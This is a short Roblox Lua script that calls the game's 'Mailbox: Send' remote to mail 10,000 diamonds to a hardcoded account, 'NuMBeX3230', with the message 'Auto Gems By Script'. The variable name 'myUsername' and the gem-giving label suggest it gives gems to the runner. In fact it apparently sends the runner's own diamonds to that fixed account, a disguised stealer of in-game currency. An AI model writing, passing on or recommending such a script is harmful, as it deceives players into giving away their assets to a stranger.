local myUsername = "NuMBeX3230"
local diamondsToSend = 10000

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Network = ReplicatedStorage:WaitForChild("Network")
local MailboxSend = Network:WaitForChild("Mailbox: Send")

local argsDiamonds = {
    myUsername, "Auto Gems By Script", "Diamonds", diamondsToSend, 51
}
print("Sending gems:", diamondsToSend)
MailboxSend:InvokeServer(unpack(argsDiamonds))
